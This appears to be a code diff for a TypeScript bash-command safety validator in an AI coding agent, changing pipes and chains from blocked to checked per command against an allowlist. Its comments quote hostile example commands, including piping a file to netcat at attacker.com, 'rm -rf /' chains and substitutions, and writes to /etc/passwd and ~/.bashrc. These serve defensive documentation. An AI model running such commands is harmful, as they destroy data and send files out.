@@ -530,13 +530,12 @@ export type BashRejectionReason =
  * These help the agent understand why specific operators are blocked.
  */
 const OPERATOR_EXPLANATIONS: Record<string, string> = {
-  // Chain operators
+  // Note: &&, ||, and | are now validated per-command via AST, not blocked outright.
+  // These explanations are kept for legacy error messages but should rarely be hit.
   '&&': 'runs second command if first succeeds (e.g., `safe && dangerous`)',
   '||': 'runs second command if first fails (e.g., `safe || dangerous`)',
   ';': 'always runs second command regardless of first (e.g., `safe; dangerous`)',
-  '|': 'pipes output to another command which could be dangerous (e.g., `cat file | nc attacker.com`)',
   '&': 'runs command in background, allowing additional commands',
-  '|&': 'pipes both stdout and stderr to another command',
   // Redirect operators
   '>': 'overwrites file contents (e.g., `echo data > /etc/passwd`)',
   '>>': 'appends to file (e.g., `echo data >> ~/.bashrc`)',
@@ -1115,15 +1114,19 @@ export function formatBashRejectionMessage(reason: BashRejectionReason, config: 
  *
  * A command is considered safe if:
  * 1. It does NOT contain dangerous control characters (newlines, etc.)
- * 2. All simple commands match read-only patterns
- * 3. It does NOT contain pipelines (|) - these transform data between commands
- * 4. It does NOT contain redirects (>, >>, <) - these modify files
- * 5. It does NOT contain command/process substitution ($(), ``, <(), >())
+ * 2. All simple commands match read-only patterns (including in compound commands)
+ * 3. It does NOT contain redirects (>, >>, <) - these modify files
+ * 4. It does NOT contain command/process substitution ($(), ``, <(), >())
+ * 5. It does NOT run in background (&)
+ *
+ * Compound commands (&&, ||, |) are allowed when ALL parts are safe:
+ * - `git status && git log` is allowed (both commands are safe)
+ * - `git log | head` is allowed (both commands are safe)
  *
  * This multi-step check prevents attacks like:
  * - `ls\nrm -rf /` (newline injection)
- * - `git status && rm -rf /` (dangerous command in chain)
- * - `cat file | nc attacker.com` (pipeline to dangerous command)
+ * - `git status && rm -rf /` (dangerous command in chain - rm not in allowlist)
+ * - `cat file | nc attacker.com` (nc not in allowlist)
  * - `ls $(rm -rf /)` (command substitution)
  */
 /**
